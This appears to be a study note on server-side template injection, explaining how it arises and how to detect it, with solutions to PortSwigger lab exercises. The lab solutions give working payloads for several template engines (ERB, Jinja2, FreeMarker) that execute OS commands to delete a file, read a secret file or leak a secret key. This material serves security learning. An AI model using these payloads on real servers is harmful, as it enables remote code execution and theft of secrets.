# What is SSTI  
Attackers can use native template syntax to insert a malicious payload into a template, allowing it to execute on the server side.　　

Template engines are designed to generate web pages by combining static templates with dynamic data. 
SSTI (Server-Side Template Injection) can occur when user input is directly concatenated into the template rather than passed as data. 
This enables attackers to insert arbitrary template directives to manipulate the template engine, 
potentially gaining complete control over the server.

# How arise
SSTI occurs when web developers directly concatenate user input into a template string before rendering. For example, a user may be allowed to customize parts of an email, like choosing the name used:

```php
$output = $twig->render("Dear " . $_GET['name']);
```
In this case, instead of passing static values, the template itself is dynamically generated using the GET parameter name. Because the template syntax is evaluated server-side, an attacker can place an SSTI payload in the name parameter:

```ruby
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Such vulnerabilities often arise from improperly designed templates by those unaware of the security implications. In the example above, various components, including user input, are concatenated and embedded into the template.


# Detecion
![image](../Server-side%20template%20injection/file/SSTI%20detect.png) 

## Detect
To detect SSTI, try fuzzing the template by inserting a series of special characters commonly used in template expressions e.g., 
```
${{<%[%'"}}%\
```
If an exception occurs, it indicates that the injected template syntax might be interpreted by the server, suggesting a potential vulnerability.

SSTI can occur in two different contexts, each requiring specific detection methods. Regardless of fuzzing results, it's essential to try context-specific approaches. These methods might reveal vulnerabilities even if fuzzing is inconclusive. If fuzzing suggests SSTI, identifying the specific context is crucial for exploitation.

- Thrown errors, revealing the vulnerability and potentially the template engine.
- Absence of the payload in the reflection, or parts of it missing, implying the server processes it differently than regular data.
- **Plaintext Context** : Distinguish from XSS by checking if the server evaluates template expressions (e.g., `{{7*7}}`, `${7*7}`).
- **Code Context** : Confirm vulnerability by altering input parameters. For instance, changing `greeting` in `http://vulnerable-website.com/?greeting=data.username` to see if the server's output is dynamic or fixed, like in `greeting=data.username}}hello` returning the username.



### Labs Portswigger
#### 1. Basic server-side template injection
>Ruby 
```
<%= system("rm+morale.txt") %>
```

#### 2. Basic server-side template injection (code context)
```
blog-post-author-display=user.first_name}}{%+import+os+%}{{os.system('rm+morale.txt')}}
```

#### 3. Server-side template injection using documentation
>Java Freemaker
```
${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
```

#### 4. Server-side template injection in an unknown language with a documented exploit
>NodeJS Handlebars exploit
>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs


#### 5. Server-side template injection with information disclosure via user-supplied objects
>Python Jinja2
```
{{settings.SECRET_KEY}}
```


#### 6. Admin panel Password Reset Email SSTI
>Jinja2  

![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)  
```
newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
&csrf=csrf
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
